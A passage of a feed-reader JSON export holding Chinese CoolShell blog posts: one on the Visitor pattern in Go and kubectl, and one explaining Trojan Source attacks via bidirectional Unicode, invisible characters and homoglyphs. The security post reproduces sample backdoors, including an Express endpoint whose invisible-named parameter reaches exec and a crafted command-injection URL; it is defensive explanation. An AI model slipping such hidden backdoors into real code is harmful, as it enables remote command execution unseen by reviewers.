<code>IntSet</code> 来依赖 <code>Undo</code> 。其依赖的是其实是一个协议，这个协议是一个没有参数的函数数组。我们也可以看到，我们 Undo 的代码就可以复用了。</p>\n<p>（全文完）</p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/21615.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2021/09/go-generics-150x150.png\" alt=\"Go编程模式 ： 泛型编程\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21615.html\">Go编程模式 ： 泛型编程</a></li><li><a href=\"https://coolshell.cn/articles/21263.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.k8s-150x150.png\" alt=\"Go 编程模式：k8s Visitor 模式\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21263.html\">Go 编程模式：k8s Visitor 模式</a></li><li><a href=\"https://coolshell.cn/articles/21228.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.line_.-150x150.png\" alt=\"Go编程模式：Pipeline\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21228.html\">Go编程模式：Pipeline</a></li><li><a href=\"https://coolshell.cn/articles/21179.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.generate-150x150.png\" alt=\"Go 编程模式：Go Generation\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21179.html\">Go 编程模式：Go Generation</a></li><li><a href=\"https://coolshell.cn/articles/21164.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.map_.reduce-150x150.png\" alt=\"Go编程模式：Map-Reduce\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21164.html\">Go编程模式：Map-Reduce</a></li><li><a href=\"https://coolshell.cn/articles/21146.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.options-150x150.png\" alt=\"Go 编程模式：Functional Options\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21146.html\">Go 编程模式：Functional Options</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21214.html\">Go编程模式：委托和反转控制</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://coolshell.cn/?p=21263",
    "timestampUsec": "1657644531898529",
    "categories": [
        "Go 语言",
        "程序设计",
        "编程语言",
        "design pattern",
        "Go",
        "golang",
        "Kubernetes",
        "Visitor Pattern",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Go 编程模式：k8s Visitor 模式",
    "author": ";陈皓",
    "published": 1608981900,
    "updated": 1608981900,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/21263.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.k8s-265x300.png\" alt=\"\" width=\"265\" height=\"300\">本篇文章主要想讨论一下，Kubernetes 的 <code>kubectl</code> 命令中的使用到到的一个编程模式 – Visitor（注：其实，<code>kubectl</code> 主要使用到了两个一个是Builder，另一个是Visitor）。本来，Visitor 是面向对象设计模英中一个很重要的设计模款（参看Wikipedia<a href=\"https://en.wikipedia.org/wiki/Visitor_pattern\" target=\"_blank\" rel=\"noopener\"> Visitor Pattern词条</a>），这个模式是一种将算法与操作对象的结构分离的一种方法。这种分离的实际结果是能够在不修改结构的情况下向现有对象结构添加新操作，是遵循开放/封闭原则的一种方法。这篇文章我们重点看一下 <code>kubelet</code> 中是怎么使用函数式的方法来实现这个模式的。</p>\n<section><h3>本文是全系列中第9 / 10篇：<a href=\"https://coolshell.cn/articles/series/go%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%BC%8F\">Go编程模式</a></h3><ul><li><span><a href=\"https://coolshell.cn/articles/21128.html\">Go编程模式：切片，接口，时间和性能</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21140.html\">Go 编程模式：错误处理</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21146.html\">Go 编程模式：Functional Options</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21214.html\">Go编程模式：委托和反转控制</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21164.html\">Go编程模式：Map-Reduce</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21179.html\">Go 编程模式：Go Generation</a></span></li><li><span><a href=\"https://coolshell.cn/articles/17929.html\">Go编程模式：修饰器</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21228.html\">Go编程模式：Pipeline</a></span></li><li><span>Go 编程模式：k8s Visitor 模式</span></li><li><span><a href=\"https://coolshell.cn/articles/21615.html\">Go编程模式 ： 泛型编程</a></span></li></ul><nav><span>« <a href=\"https://coolshell.cn/articles/21228.html\" rel=\"prev\" title=\"Go编程模式：Pipeline\">上一篇文章</a></span><span><a href=\"https://coolshell.cn/articles/21615.html\" rel=\"next\" title=\"Go编程模式 ： 泛型编程\">下一篇文章</a> »</span></nav></section>\n<h4>一个简单示例</h4>\n<p>我们还是先来看一个简单设计模式的Visitor的示例。</p>\n<ul>\n<li>我们的代码中有一个<code>Visitor</code>的函数定义，还有一个<code>Shape</code>接口，其需要使用 <code>Visitor</code>函数做为参数。</li>\n<li>我们的实例的对象 <code>Circle</code>和 <code>Rectangle</code>实现了 <code>Shape</code> 的接口的 <code>accept()</code> 方法，这个方法就是等外面给我传递一个Visitor。</li>\n</ul>\n<p><span></span></p>\n<pre data-enlighter-language=\"golang\">package main\n\nimport (\n    \"encoding/json\"\n    \"encoding/xml\"\n    \"fmt\"\n)\n\ntype Visitor func(shape Shape)\n\ntype Shape interface {\n    accept(Visitor)\n}\n\ntype Circle struct {\n    Radius int\n}\n\nfunc (c Circle) accept(v Visitor) {\n    v(c)\n}\n\ntype Rectangle struct {\n    Width, Heigh int\n}\n\nfunc (r Rectangle) accept(v Visitor) {\n    v(r)\n}\n</pre>\n<p>然后，我们实现两个Visitor，一个是用来做JSON序列化的，另一个是用来做XML序列化的</p>\n<pre data-enlighter-language=\"golang\">func JsonVisitor(shape Shape) {\n    bytes, err := json.Marshal(shape)\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(string(bytes))\n}\n\nfunc XmlVisitor(shape Shape) {\n    bytes, err := xml.Marshal(shape)\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(string(bytes))\n}\n</pre>\n<p>下面是我们的使用Visitor这个模式的代码</p>\n<pre data-enlighter-language=\"golang\">func main() {\n  c := Circle{10}\n  r :=  Rectangle{100, 200}\n  shapes := []Shape{c, r}\n\n  for _, s := range shapes {\n    s.accept(JsonVisitor)\n    s.accept(XmlVisitor)\n  }\n\n}</pre>\n<p>其实，这段代码的目的就是想解耦 数据结构和 算法，使用 Strategy 模式也是可以完成的，而且会比较干净。<strong>但是在有些情况下，多个Visitor是来访问一个数据结构的不同部分，这种情况下，数据结构有点像一个数据库，而各个Visitor会成为一个个小应用。</strong> <code>kubectl</code>就是这种情况。</p>\n<h4>k8s相关背景</h4>\n<p>接下来，我们再来了解一下相关的知识背景：</p>\n<ul>\n<li>对于Kubernetes，其抽象了很多种的Resource，比如：Pod, ReplicaSet, ConfigMap, Volumes, Namespace, Roles …. 种类非常繁多，这些东西构成为了Kubernetes的数据模型（点击 <a href=\"https://github.com/kubernauts/practical-kubernetes-problems/blob/master/images/k8s-resources-map.png\" target=\"_blank\" rel=\"noopener\">Kubernetes Resources 地图</a> 查看其有多复杂）</li>\n<li><code>kubectl</code> 是Kubernetes中的一个客户端命令，操作人员用这个命令来操作Kubernetes。<code>kubectl</code> 会联系到 Kubernetes 的API Server，API Server会联系每个节点上的 <code>kubelet</code> ，从而达到控制每个结点。</li>\n<li><code>kubectl</code> 主要的工作是处理用户提交的东西（包括，命令行参数，yaml文件等），然后其会把用户提交的这些东西组织成一个数据结构体，然后把其发送给 API Server。</li>\n<li>相关的源代码在 <code>src/k8s.io/cli-runtime/pkg/resource/visitor.go</code> 中（<a href=\"https://github.com/kubernetes/kubernetes/blob/cea1d4e20b4a7886d8ff65f34c6d4f95efcb4742/staging/src/k8s.io/cli-runtime/pkg/resource/visitor.go\" target=\"_blank\" rel=\"noopener\">源码链接</a>）</li>\n</ul>\n<p><code>kubectl</code> 的代码比较复杂，不过，其本原理简单来说，<strong>它从命令行和yaml文件中获取信息，通过Builder模式并把其转成一系列的资源，最后用 Visitor 模式模式来迭代处理这些Reources</strong>。</p>\n<p>下面我们来看看 <code>kubectl</code> 的实现，为了简化，我用一个小的示例来表明 ，而不是直接分析复杂的源码。</p>\n<h4>kubectl的实现方法</h4>\n<h5>Visitor模式定义</h5>\n<p>首先，<code>kubectl</code> 主要是用来处理 <code>Info</code>结构体，下面是相关的定义：</p>\n<pre data-enlighter-language=\"golang\">type VisitorFunc func(*Info, error) error\n\ntype Visitor interface {\n    Visit(VisitorFunc) error\n}\n\ntype Info struct {\n    Namespace   string\n    Name        string\n    OtherThings string\n}\nfunc (info *Info) Visit(fn VisitorFunc) error {\n  return fn(info, nil)\n}</pre>\n<p>我们可以看到，</p>\n<ul>\n<li>有一个 <code>VisitorFunc</code> 的函数类型的定义</li>\n<li>一个 <code>Visitor</code> 的接口，其中需要 <code>Visit(VisitorFunc) error</code>  的方法（这就像是我们上面那个例子的 <code>Shape</code> ）</li>\n<li>最后，为<code>Info</code> 实现 <code>Visitor</code> 接口中的 <code>Visit()</code> 方法，实现就是直接调用传进来的方法（与前面的例子相仿）</li>\n</ul>\n<p>我们再来定义几种不同类型的 Visitor。</p>\n<h5>Name Visitor</h5>\n<p>这个Visitor 主要是用来访问 <code>Info</code> 结构中的 <code>Name</code> 和 <code>NameSpace</code> 成员</p>\n<pre data-enlighter-language=\"golang\">type NameVisitor struct {\n  visitor Visitor\n}\n\nfunc (v NameVisitor) Visit(fn VisitorFunc) error {\n  return v.visitor.Visit(func(info *Info, err error) error {\n    fmt.Println(\"NameVisitor() before call function\")\n    err = fn(info, err)\n    if err == nil {\n      fmt.Printf(\"==&gt; Name=%s, NameSpace=%s\\n\", info.Name, info.Namespace)\n    }\n    fmt.Println(\"NameVisitor() after call function\")\n    return err\n  })\n}</pre>\n<p>我们可以看到，上面的代码：</p>\n<ul>\n<li>声明了一个 <code>NameVisitor</code> 的结构体，这个结构体里有一个 <code>Visitor</code> 接口成员，这里意味着多态。</li>\n<li>在实现 <code>Visit()</code> 方法时，其调用了自己结构体内的那个 <code>Visitor</code>的 <code>Visitor()</code> 方法，这其实是一种修饰器的模式，用另一个Visitor修饰了自己（关于修饰器模式，参看《<a title=\"Go编程模式：修饰器\" href=\"https://coolshell.cn/articles/17929.html\" target=\"_blank\" rel=\"noopener\">Go编程模式：修饰器</a>》）</li>\n</ul>\n<h5>Other Visitor</h5>\n<p>这个Visitor主要用来访问 <code>Info</code> 结构中的 <code>OtherThings</code> 成员</p>\n<pre data-enlighter-language=\"golang\">type OtherThingsVisitor struct {\n  visitor Visitor\n}\n\nfunc (v OtherThingsVisitor) Visit(fn VisitorFunc) error {\n  return v.visitor.Visit(func(info *Info, err error) error {\n    fmt.Println(\"OtherThingsVisitor() before call function\")\n    err = fn(info, err)\n    if err == nil {\n      fmt.Printf(\"==&gt; OtherThings=%s\\n\", info.OtherThings)\n    }\n    fmt.Println(\"OtherThingsVisitor() after call function\")\n    return err\n  })\n}</pre>\n<p>实现逻辑同上，我就不再重新讲了</p>\n<h5>Log Visitor</h5>\n<pre data-enlighter-language=\"golang\">type LogVisitor struct {\n  visitor Visitor\n}\n\nfunc (v LogVisitor) Visit(fn VisitorFunc) error {\n  return v.visitor.Visit(func(info *Info, err error) error {\n    fmt.Println(\"LogVisitor() before call function\")\n    err = fn(info, err)\n    fmt.Println(\"LogVisitor() after call function\")\n    return err\n  })\n}</pre>\n<h5>使用方代码</h5>\n<p>现在我们看看如果使用上面的代码：</p>\n<pre data-enlighter-language=\"golang\">func main() {\n  info := Info{}\n  var v Visitor = &amp;info\n  v = LogVisitor{v}\n  v = NameVisitor{v}\n  v = OtherThingsVisitor{v}\n\n  loadFile := func(info *Info, err error) error {\n    info.Name = \"Hao Chen\"\n    info.Namespace = \"MegaEase\"\n    info.OtherThings = \"We are running as remote team.\"\n    return nil\n  }\n  v.Visit(loadFile)\n}</pre>\n<p>上面的代码，我们可以看到</p>\n<ul>\n<li>Visitor们一层套一层</li>\n<li>我用 <code>loadFile</code> 假装从文件中读如数据</li>\n<li>最后一条 <code>v.Visit(loadfile)</code> 我们上面的代码就全部开始激活工作了。</li>\n</ul>\n<p>上面的代码输出如下的信息，你可以看到代码的执行顺序是怎么执行起来了</p>\n<pre data-enlighter-language=\"generic\">LogVisitor() before call function\nNameVisitor() before call function\nOtherThingsVisitor() before call function\n==&gt; OtherThings=We are running as remote team.\nOtherThingsVisitor() after call function\n==&gt; Name=Hao Chen, NameSpace=MegaEase\nNameVisitor() after call function\nLogVisitor() after call function</pre>\n<p>我们可以看到，上面的代码有以下几种功效：</p>\n<ul>\n<li>解耦了数据和程序。</li>\n<li>使用了修饰器模式</li>\n<li>还做出来pipeline的模式</li>\n</ul>\n<p>所以，其实，我们是可以把上面的代码重构一下的。</p>\n<h5>Visitor修饰器</h5>\n<p>下面，我们用<a title=\"Go编程模式：修饰器\" href=\"https://coolshell.cn/articles/17929.html\" target=\"_blank\" rel=\"noopener\">修饰器模式</a>来重构一下上面的代码。</p>\n<pre data-enlighter-language=\"golang\">type DecoratedVisitor struct {\n  visitor    Visitor\n  decorators []VisitorFunc\n}\n\nfunc NewDecoratedVisitor(v Visitor, fn ...VisitorFunc) Visitor {\n  if len(fn) == 0 {\n    return v\n  }\n  return DecoratedVisitor{v, fn}\n}\n\n// Visit implements Visitor\nfunc (v DecoratedVisitor) Visit(fn VisitorFunc) error {\n  return v.visitor.Visit(func(info *Info, err error) error {\n    if err != nil {\n      return err\n    }\n    if err := fn(info, nil); err != nil {\n      return err\n    }\n    for i := range v.decorators {\n      if err := v.decorators[i](info, nil); err != nil {\n        return err\n      }\n    }\n    return nil\n  })\n}</pre>\n<p>上面的代码并不复杂，</p>\n<ul>\n<li>用一个 <code>DecoratedVisitor</code> 的结构来存放所有的<code>VistorFunc</code>函数</li>\n<li><code>NewDecoratedVisitor</code> 可以把所有的 <code>VisitorFunc</code>转给它，构造 <code>DecoratedVisitor</code> 对象。</li>\n<li><code>DecoratedVisitor</code>实现了 <code>Visit()</code> 方法，里面就是来做一个for-loop，顺着调用所有的 <code>VisitorFunc</code></li>\n</ul>\n<p>于是，我们的代码就可以这样运作了：</p>\n<pre data-enlighter-language=\"generic\">info := Info{}\nvar v Visitor = &amp;info\nv = NewDecoratedVisitor(v, NameVisitor, OtherVisitor)\n\nv.Visit(LoadFile)</pre>\n<p>是不是比之前的那个简单？注意，这个<code>DecoratedVisitor</code> 同样可以成为一个Visitor来使用。</p>\n<p>好，上面的这些代码全部存在于 <code>kubectl</code> 的代码中，你看懂了这里面的代码逻辑，相信你也能够看懂 <code>kubectl</code> 的代码了。</p>\n<p>（全文完）</p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/21615.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2021/09/go-generics-150x150.png\" alt=\"Go编程模式 ： 泛型编程\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21615.html\">Go编程模式 ： 泛型编程</a></li><li><a href=\"https://coolshell.cn/articles/21228.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.line_.-150x150.png\" alt=\"Go编程模式：Pipeline\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21228.html\">Go编程模式：Pipeline</a></li><li><a href=\"https://coolshell.cn/articles/21214.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.pair_-150x150.png\" alt=\"Go编程模式：委托和反转控制\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21214.html\">Go编程模式：委托和反转控制</a></li><li><a href=\"https://coolshell.cn/articles/21179.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.generate-150x150.png\" alt=\"Go 编程模式：Go Generation\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21179.html\">Go 编程模式：Go Generation</a></li><li><a href=\"https://coolshell.cn/articles/21164.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.map_.reduce-150x150.png\" alt=\"Go编程模式：Map-Reduce\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21164.html\">Go编程模式：Map-Reduce</a></li><li><a href=\"https://coolshell.cn/articles/21146.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.options-150x150.png\" alt=\"Go 编程模式：Functional Options\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21146.html\">Go 编程模式：Functional Options</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21263.html\">Go 编程模式：k8s Visitor 模式</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://coolshell.cn/?p=21649",
    "timestampUsec": "1657644531898532",
    "categories": [
        "网络安全",
        "hacker",
        "Unicode",
        "木马",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "源代码特洛伊木马攻击",
    "author": ";陈皓",
    "published": 1637312520,
    "updated": 1637312520,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/21649.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv.jpg\" alt=\"\" width=\"340\" height=\"270\">最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below.”也就是说我们的代码中有一些 bidirectional unicode 的文本，中文直译作 “双向文本”，意思是一些语言是从左到右的，而另一些则是是从右到左的（如：阿拉伯语），如果同一个文件里，即有从左向右的文本也有从右向左文本两种的混搭，那么，就叫bi-direction。术语通常缩写为“ <b>BiDi</b> ”或“ <b>bidi</b> ”。使用双向文本对于中国人来说并不陌生，因为中文又可以从左到右，也可以从右到左，还可以从上到下。</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-1024x329.jpg\" alt=\"\" width=\"640\" height=\"206\"></p>\n<p>早期的计算机仅设计为基于拉丁字母的从左到右的方式。添加新的字符集和字符编码使许多其他从左到右的脚本能够得到支持，但不容易支持从右到左的脚本，例如阿拉伯语或希伯来语，并且将两者混合使用更是不可能。从右到左的脚本是通过<a title=\"ISO/IEC 8859-6\" href=\"https://en.wikipedia.org/wiki/ISO/IEC_8859-6\">ISO/IEC 8859-6</a>和<a title=\"ISO/IEC 8859-8\" href=\"https://en.wikipedia.org/wiki/ISO/IEC_8859-8\">ISO/IEC 8859-8</a>等编码引入的，通常以书写和阅读顺序存储字母。可以简单地将从左到右的显示顺序翻转为从右到左的显示顺序，但这样做会牺牲正确显示从左到右脚本的能力。通过双向文本支持，可以在同一页面上混合来自不同脚本的字符，而不管书写方向如何。</p>\n<p><span></span></p>\n<p>双向文本支持是计算机系统正确显示双向文本的能力。对于Unicode来说，其标准为完整的 BiDi 支持提供了基础，其中包含有关如何编码和显示从左到右和从右到左脚本的混合的详细规则。你可以使用一些控制字符来帮助你完成双向文本的编排。</p>\n<p>好的，科普完“双向文本”后，我们正式进入正题，为什么Github 会出这个警告？Github的官方博客“<a href=\"https://github.blog/changelog/2021-10-31-warning-about-bidirectional-unicode-text/\" target=\"_blank\" rel=\"noopener\">关于双向Unicode的警告</a>”中说，使用一些Unicode中的用于控制的隐藏字符，可以让你代码有着跟看上去完全不一样的行为。</p>\n<p>我们先来看一个示例，下面这段 Go 的代码就会把 “Hello, World”的每个字符转成整型，然后计算其中多少个为 1 的 bit。</p>\n<pre data-enlighter-language=\"golang\">package main\n\nimport \"fmt\"\n\nfunc main() {\n  str, mask := \"Hello, World!‮10x‭\", 0\n\n  bits := 0\n  for _, ch := range str {\n    for ch &gt; 0 {\n      bits += int(ch) &amp; mask\n      ch = ch &gt;&gt; 1\n    }\n  }\n  fmt.Println(\"Total bits set:\", bits)\n}</pre>\n<p>这个代码你看上去没有什么 奇怪的地方，但是你在执行的时候（可以直接上Go Playground上执行  –<a href=\"https://play.golang.org/p/e2BDZvFlet0\" target=\"_blank\" rel=\"noopener\"> https://play.golang.org/p/e2BDZvFlet0</a>），你会发现，结果是 0，也就是说“Hello, World”中没有值为 1 的 bit 位。这究竟发生了什么事？</p>\n<p>如果你把上面这段代码拷贝粘贴到字符界面上的 vim 编辑器里，你就可以看到下面这一幕。</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637307319589.jpg\" alt=\"\" width=\"500\" height=\"324\"></p>\n<p>其中有两个浅蓝色的尖括号的东西—— <code>&lt;202e&gt;</code> 和 <code>&lt;202d&gt;</code> 。这两个字符是两个Unicode的控制字符（注：完整的双向文本控制字符参看 <a href=\"https://www.compart.com/en/unicode/bidiclass\" target=\"_blank\" rel=\"noopener\">Unicode Bidirectional Classes</a>）：</p>\n<ul>\n<li><strong>U+202E – Right-to-Left Override [RLO] </strong><br>\n表示，开始从右到左显示，于是，接下来的文本 <code>10x\", 0</code> 变成了 <code>0 ,\"x01</code></li>\n<li><strong>U+202D – Left-to-Right Override [LRO]</strong><br>\n表示，开始从左到右显示，于是，<code>0,\"x01</code> 中的前4个字符<code>0 ,\"</code> 反转成  <code>\", 0</code>，于是整个文本成了 <code>\", 0x01</code></li>\n</ul>\n<p>所以，你在视觉上看到的是结果是—— <code>\"Hello, World!”, 0x01</code>， 但是实际上是完全是另外一码事。</p>\n<p>然后，Github官方博客中还给了一个安全问题 <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42574\">CVE-2021-42574</a> ——</p>\n<blockquote><p>在 Unicode 规范到 14.0 的双向算法中发现了一个问题。它允许通过控制序列对字符进行视觉重新排序，可用于制作源代码，呈现与编译器和解释器执行逻辑完全不同的逻辑。攻击者可以利用这一点对接受 Unicode 的编译器的源代码进行编码，从而将目标漏洞引入人类审查者不可见的地方。</p></blockquote>\n<p>这个安全问题在剑桥大学的这篇论文“<a href=\"https://www.trojansource.codes/\" target=\"_blank\" rel=\"noopener\">Some Vulnerabilities are Invisible</a>”中有详细的描述。其中PDF版的文章中也给了这么一个示例：</p>\n<p>通过双向文本可以把下面这段代码：</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637308872541.jpg\" alt=\"\" width=\"569\" height=\"240\"></p>\n<p>伪装成下面的这个样子：</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637308847435.jpg\" alt=\"\" width=\"580\" height=\"245\"></p>\n<p>在图 2 中<code>'alice'</code>被定义为价值 100，然后是一个从 Alice 中减去资金的函数。最后一行以 50 的值调用该函数，因此该小程序在执行时应该给我们 50 的结果。</p>\n<p>然而，图 1 向我们展示了如何使用双向字符来破坏程序的意图：通过插入<strong>RLI (Right To Left Isolate)</strong><i> – </i><strong>U+2067</strong><i>，</i>我们将文本方向从传统英语更改为从右到左。尽管我们使用了减去资金功能，但图 1 的输出变为 100。</p>\n<p>除此之外，支持Unicode还可以出现很多其它的攻击，尤其是通过一些“不可见字符”，或是通过“同形字符”在源代码里面埋坑。比如文章“<a href=\"https://certitude.consulting/blog/en/invisible-backdoor/\" target=\"_blank\" rel=\"noopener\">The Invisible Javascript Backdoor</a>”里的这个示例：</p>\n<pre data-enlighter-language=\"js\">const express = require('express');\nconst util = require('util');\nconst exec = util.promisify(require('child_process').exec);\n\nconst app = express();\n\napp.get('/network_health', async (req, res) =&gt; {\n    const { timeout,ㅤ} = req.query;\n    const checkCommands = [\n        'ping -c 1 google.com',\n        'curl -s http://example.com/',ㅤ\n    ];\n\n    try {\n        await Promise.all(checkCommands.map(cmd =&gt; \n                cmd &amp;&amp; exec(cmd, { timeout: +timeout || 5_000 })));\n        res.status(200);\n        res.send('ok');\n    } catch(e) {\n        res.status(500);\n        res.send('failed');\n    }\n});\n\napp.listen(8080);</pre>\n<p>上面这个代码实现了一个非常简单的网络健康检查，HTTP会执行 <code>ping -c 1 google.com</code> 以及 <code>curl -s http://example.com</code> 这两个命令来查看网络是否正常。其中，可选输入 HTTP 参数<code>timeout</code>限制命令执行时间。</p>\n<p>然后，上面这个代码是有不可见的Unicode 字符，如果你使用VSCode，把编码从 Unicode 改成 DOS (CP437) 后你就可以看到这个Unicode了</p>\n<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-1024x923.jpg\" alt=\"\" width=\"640\" height=\"577\"></p>\n<p>于是，一个你看不见的 <code>πàñ</code> 变量就这样生成了，你再仔细看一下整个逻辑，这个看不见的变量，可以让你的代码执行他想要的命令。因为，http 的请求中有第二个参数，这个参数可奖在后面被执行。于是我们可以构造如下的的 HTTP 请求：</p>\n<p><strong>http://host:port/network_health?%E3%85%A4=&lt;any command&gt;</strong></p>\n<p>其中的，%E3%85%A4 就是 <code>\\u3164</code> 这个不可见Unicode 的编码，于是，一个后门代码就这样在神不知鬼不觉的情况下注入了。</p>\n<p>另外，还可以使用“同形字符”，看看下面这个示例：</p>\n<pre data-enlighter-language=\"c\">if(environmentǃ=ENV_PROD){\n    // bypass authZ checks in DEV\n    return true;\n}</pre>\n<p>如何你以为 <code>ǃ</code> 是 惊叹号，其实不是，它是一个Unicode <code>╟â</code>。这种东西就算你把你的源码转成 DOS(CP437) 也没用，因为用肉眼在一大堆正常的字符中找不正常的，我觉得是基本不可能的事。</p>\n<p>现在，是时候检查一下你的代码有没有上述的这些情况了……</p>\n<p>（全文完）</p>\n<p> </p>\n<p> </p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/3684.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2011/02/1128-150x150.jpg\" alt=\"Web开发人员速查卡\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/3684.html\">Web开发人员速查卡</a></li><li><a href=\"https://coolshell.cn/articles/2439.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/16.jpg\" alt=\"黑客的价值观\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/2439.html\">黑客的价值观</a></li><li><a href=\"https://coolshell.cn/articles/1957.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/9.jpg\" alt=\"Web程序的最佳测试数据\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/1957.html\">Web程序的最佳测试数据</a></li><li><a href=\"https://coolshell.cn/articles/1331.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/11.jpg\" alt=\"Unicode字符预览表\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/1331.html\">Unicode字符预览表</a></li><li><a href=\"https://coolshell.cn/articles/1928.html\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/27.jpg\" alt=\"如何使用Python操作摄像头\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/1928.html\">如何使用Python操作摄像头</a></li><li><a href=\"https://coolshell.cn/articles/8460.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2012/11/go2-150x150.jpg\" alt=\"Go 语言简介（上）— 